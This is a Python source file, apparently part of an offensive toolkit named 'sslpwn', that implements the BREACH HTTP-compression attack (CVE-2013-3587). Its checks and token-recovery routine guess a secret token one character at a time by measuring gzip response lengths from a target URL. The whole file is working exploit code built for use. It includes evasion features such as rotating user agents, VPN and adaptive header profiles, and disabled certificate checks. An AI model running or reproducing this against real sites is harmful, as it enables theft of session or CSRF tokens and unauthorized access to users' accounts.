"""
BREACH attack implementation (CVE-2013-3587).

Exploits HTTP compression to extract secrets from response bodies.
"""

import requests
import string
import aiohttp
import asyncio
from typing import Optional

from sslpwn.attacks.base import BaseAttack


class BreachAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 token_parameter: str, mask_length: int = 10,
                 adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.token_parameter = token_parameter
        self.mask_length = mask_length

    def check_vulnerability(self) -> bool:
        """Sync check. Used as fallback."""
        url = f"{self.target_url}/?{self.token_parameter}=a"
        headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
        try:
            resp = requests.get(url, headers=headers, timeout=5, verify=False)
            if "Content-Length" in resp.headers:
                len_gzip = int(resp.headers["Content-Length"])
                headers_none = headers.copy()
                del headers_none["Accept-Encoding"]
                resp2 = requests.get(url, headers=headers_none, timeout=5, verify=False)
                if "Content-Length" in resp2.headers:
                    len_none = int(resp2.headers["Content-Length"])
                    return len_gzip < len_none
            return False
        except Exception:
            return False

    async def check_vulnerability_async(self) -> bool:
        """Async check using aiohttp."""
        url = f"{self.target_url}/?{self.token_parameter}=a"
        headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if "Content-Length" in resp.headers:
                        len_gzip = int(resp.headers["Content-Length"])
                        headers_none = headers.copy()
                        del headers_none["Accept-Encoding"]
                        async with session.get(url, headers=headers_none, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp2:
                            if "Content-Length" in resp2.headers:
                                len_none = int(resp2.headers["Content-Length"])
                                return len_gzip < len_none
            return False
        except Exception:
            return False

    def exploit(self) -> bool:
        """Full BREACH token recovery (sync)."""
        self.output.log("Starting BREACH attack", "INFO")
        mask = "." * self.mask_length
        chars = string.ascii_letters + string.digits + "_{}"

        if self.adaptive:
            profile = self.adaptive.wait_and_prepare()
            headers = profile.as_headers()
        else:
            self.rate_limiter.wait()
            headers = {"User-Agent": self.user_agents.random()}
        headers["Accept-Encoding"] = "gzip, deflate"

        baseline_url = f"{self.target_url}/?{self.token_parameter}={mask}{mask}"
        try:
            resp = requests.get(baseline_url, headers=headers, timeout=10, verify=False)
            if self.adaptive:
                self.adaptive.report_response(status=resp.status_code, headers=dict(resp.headers))
            responB = int(resp.headers.get("Content-Length", 0))
        except Exception as exc:
            if self.adaptive:
                self.adaptive.report_response(error=str(exc))
            self.output.log(f"Baseline request failed: {exc}", "ERROR")
            return False

        self.output.log(f"Baseline length: {responB}", "INFO")

        token = ""
        found = True
        while found:
            found = False
            for c in chars:
                len1 = self._measure_length(token + c, mask)
                len2 = self._measure_length(token, mask + c)
                self.output.log(f"Trying '{token+c}': len1={len1}, len2={len2}", "DEBUG")
                if len1 <= responB and len2 > len1:
                    token += c
                    self.output.log(f"Found char: {c}  Token so far: {token}", "SUCCESS")
                    found = True
                    break
            if not found:
                self.output.log("No further character found.", "INFO")

        if token:
            self.output.log(f"Recovered token: {token}", "SUCCESS")
            return True
        self.output.log("No token recovered.", "WARN")
        return False

    def _measure_length(self, guess_prefix: str, mask: str) -> int:
        url = f"{self.target_url}/?{self.token_parameter}={guess_prefix}{mask}{mask}"
        headers = {}
        if self.adaptive:
            profile = self.adaptive.wait_and_prepare()
            headers.update(profile.as_headers())
        else:
            self.rate_limiter.wait()
            headers["User-Agent"] = self.user_agents.random()
        headers["Accept-Encoding"] = "gzip, deflate"
        try:
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            if self.adaptive:
                self.adaptive.report_response(status=resp.status_code, headers=dict(resp.headers))
            return int(resp.headers.get("Content-Length", 0))
        except Exception as exc:
            if self.adaptive:
                self.adaptive.report_response(error=str(exc))
            self.output.log(f"Request failed: {exc}", "WARN")
            return 0
